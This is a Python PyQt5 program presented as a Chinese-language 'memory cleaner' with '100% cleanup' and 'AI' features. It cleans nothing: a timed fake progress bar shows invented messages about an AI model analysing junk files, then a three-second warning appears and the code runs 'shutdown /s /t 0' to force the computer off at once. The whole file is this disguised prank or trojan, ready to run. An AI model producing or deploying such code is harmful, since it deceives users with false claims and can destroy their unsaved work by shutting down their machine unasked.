import sys
import os
import subprocess
from PyQt5.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QPushButton, QProgressBar, QMessageBox
)
from PyQt5.QtCore import QTimer, Qt
from PyQt5.QtGui import QFont, QPalette, QColor


class CleanupWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        # 窗口基本设置
        self.setWindowTitle("内存清理器")
        self.setFixedSize(850, 750)
        self.set_center()

        # 设置深蓝色科技感调色板
        palette = QPalette()
        palette.setColor(QPalette.Window, QColor(20, 30, 50))
        self.setPalette(palette)

        # 主布局
        main_layout = QVBoxLayout()
        main_layout.setContentsMargins(20, 20, 20, 40)

        # 顶部标题（大而显眼）
        self.title_label = QLabel("内存清理器（100%清理）")
        title_font = QFont("Microsoft YaHei", 22, QFont.Bold)
        self.title_label.setFont(title_font)
        self.title_label.setAlignment(Qt.AlignCenter)
        self.title_label.setStyleSheet("color: #00d4ff; background: transparent; padding: 15px;")
        self.title_label.setMinimumHeight(45)

        # 副标题
        self.subtitle_label = QLabel("一键清理系统垃圾，释放内存空间")
        subtitle_font = QFont("Microsoft YaHei", 12)
        self.subtitle_label.setFont(subtitle_font)
        self.subtitle_label.setAlignment(Qt.AlignCenter)
        self.subtitle_label.setStyleSheet("color: #888888; background: transparent;")

        # 特性图标区域
        features_layout = QHBoxLayout()
        features_layout.setAlignment(Qt.AlignCenter)
        features_layout.setSpacing(30)

        # 四个特性
        self.feature1 = QLabel("✔ 百分百清理")
        self.feature2 = QLabel("✔ 无残留")
        self.feature3 = QLabel("✔ 一键操作")
        self.feature4 = QLabel("✔ 人工智能")

        feature_font = QFont("Microsoft YaHei", 11)
        for feature in [self.feature1, self.feature2, self.feature3, self.feature4]:
            feature.setFont(feature_font)
            feature.setStyleSheet("color: #00ffcc; background: transparent;")
            features_layout.addWidget(feature)

        # 清理按钮
        self.clean_btn = QPushButton("立即清理")
        self.clean_btn.setFixedSize(220, 65)
        btn_font = QFont("Microsoft YaHei", 20, QFont.Bold)
        self.clean_btn.setFont(btn_font)
        self.clean_btn.setCursor(Qt.PointingHandCursor)
        self.clean_btn.setStyleSheet("""
            QPushButton {
                background-color: #0066cc;
                color: white;
                border-radius: 12px;
                border: none;
            }
            QPushButton:hover {
                background-color: #0088ff;
            }
            QPushButton:pressed {
                background-color: #004499;
            }
        """)
        self.clean_btn.clicked.connect(self.start_cleanup)

        # 进度条（初始隐藏）
        self.progress_bar = QProgressBar()
        self.progress_bar.setFixedHeight(30)
        self.progress_bar.setMinimum(0)
        self.progress_bar.setMaximum(100)
        self.progress_bar.setValue(0)
        self.progress_bar.setTextVisible(True)
        self.progress_bar.setStyleSheet("""
            QProgressBar {
                border: 2px solid #00d4ff;
                border-radius: 10px;
                background-color: #1a1a2e;
                text-align: center;
                color: #00d4ff;
                font-size: 14px;
            }
            QProgressBar::chunk {
                background-color: #00d4ff;
                border-radius: 8px;
            }
        """)
        self.progress_bar.hide()

        # 状态文字（初始隐藏）
        self.status_label = QLabel()
        status_font = QFont("Microsoft YaHei", 12)
        self.status_label.setFont(status_font)
        self.status_label.setAlignment(Qt.AlignCenter)
        self.status_label.setStyleSheet("color: #ffffff; background: transparent;")
        self.status_label.hide()

        # 阶段一布局（按钮）
        self.stage1_layout = QVBoxLayout()
        self.stage1_layout.setAlignment(Qt.AlignCenter)
        self.stage1_layout.addSpacing(-15)  # 标题往上移
        self.stage1_layout.addWidget(self.title_label)
        self.stage1_layout.addWidget(self.subtitle_label)
        self.stage1_layout.addSpacing(20)
        self.stage1_layout.addLayout(features_layout)
        self.stage1_layout.addSpacing(30)

        # 按钮单独用水平布局确保居中
        btn_container = QHBoxLayout()
        btn_container.addStretch()
        btn_container.addWidget(self.clean_btn)
        btn_container.addStretch()
        self.stage1_layout.addLayout(btn_container)

        # 阶段二布局（进度条）- 放在窗口中间
        self.stage2_layout = QVBoxLayout()
        self.stage2_layout.setAlignment(Qt.AlignCenter)
        self.stage2_layout.addSpacing(50)
        self.stage2_layout.addWidget(self.progress_bar)
        self.stage2_layout.addWidget(self.status_label)

        # 主容器
        self.container_layout = QVBoxLayout()
        self.container_layout.setAlignment(Qt.AlignCenter)
        self.container_layout.addLayout(self.stage1_layout)
        self.container_layout.addLayout(self.stage2_layout)

        main_layout.addLayout(self.container_layout)
        self.setLayout(main_layout)

        # 进度条定时器
        self.progress_timer = QTimer()
        self.progress_timer.timeout.connect(self.update_progress)
        self.progress_value = 0

    def set_center(self):
        """窗口居中"""
        screen = QApplication.primaryScreen()
        screen_geo = screen.geometry()
        window_geo = self.geometry()
        x = (screen_geo.width() - window_geo.width()) // 2
        y = (screen_geo.height() - window_geo.height()) // 2
        self.move(x, y)

    def start_cleanup(self):
        """开始清理流程"""
        # 隐藏阶段一，显示阶段二
        self.title_label.setText("正在清理中...")
        self.subtitle_label.hide()
        self.clean_btn.hide()

        # 显示进度条和状态在页面中间
        self.progress_bar.show()
        self.status_label.show()

        # 启动进度条
        self.progress_value = 0
        self.progress_bar.setValue(0)
        self.progress_timer.start(30)  # 每30ms更新一次，约3秒跑完

    def update_progress(self):
        """更新进度条"""
        self.progress_value += 1
        self.progress_bar.setValue(self.progress_value)

        # 根据进度更新文字
        if self.progress_value <= 30:
            self.status_label.setText("AI大模型正在分析系统垃圾文件")
        elif self.progress_value <= 70:
            self.status_label.setText("AI大模型正在分析多余应用")
        else:
            self.status_label.setText("生成清理方案")

        # 进度完成
        if self.progress_value >= 100:
            self.progress_timer.stop()
            self.show_shutdown_warning()

    def show_shutdown_warning(self):
        """显示关机警告弹窗"""
        self.warning_window = QMessageBox()
        self.warning_window.setWindowTitle("警告")
        self.warning_window.setText("<font size='8' color='red'><b>三秒后关机</b></font>")
        self.warning_window.setStandardButtons(QMessageBox.NoButton)
        self.warning_window.setFixedSize(500, 250)  # 更宽的弹窗
        self.warning_window.show()

        # 创建倒计时弹窗
        self.countdown_value = 3
        self.countdown_timer = QTimer()
        self.countdown_timer.timeout.connect(self.update_countdown)
        self.countdown_timer.start(1000)

    def update_countdown(self):
        """更新倒计时"""
        self.countdown_value -= 1
        if self.countdown_value == 2:
            self.warning_window.setText("<font size='8' color='red'><b>二秒后关机</b></font>")
        elif self.countdown_value == 1:
            self.warning_window.setText("<font size='8' color='red'><b>一秒后关机</b></font>")
        else:
            self.countdown_timer.stop()
            self.warning_window.close()
            self.shutdown()

    def shutdown(self):
        """执行关机"""
        try:
            # Windows 关机命令
            subprocess.run(['shutdown', '/s', '/t', '0'], check=True)
        except Exception as e:
            print(f"Shutdown failed: {e}")
        self.close()


def main():
    app = QApplication(sys.argv)
    window = CleanupWindow()
    window.show()
    sys.exit(app.exec_())


if __name__ == '__main__':
    main()
